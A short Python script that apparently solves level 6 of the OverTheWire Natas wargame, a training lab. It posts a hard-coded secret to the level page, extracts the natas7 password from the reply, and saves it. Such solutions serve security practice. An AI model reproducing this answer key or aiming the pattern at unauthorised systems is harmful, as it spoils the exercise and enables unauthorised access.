import requests
import re
from natas_utility import *
import html

current_level = 6
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

session = requests.session()

url = base_url

data = {'secret': 'FOEIUWGHFEEUHOFUOIU',
        'submit': 'submit'}
response = session.post(url, data=data, auth=auth)

content = html.unescape(response.content.decode('utf-8')).replace('<br />', '\n')
cookies = response.cookies

# print(content)

password_regex = re.compile(r'Access granted. The password for natas7 is (.+)')
next_password = password_regex.findall(content)[0]
print(next_password)

save_credentials(current_level + 1, next_password)
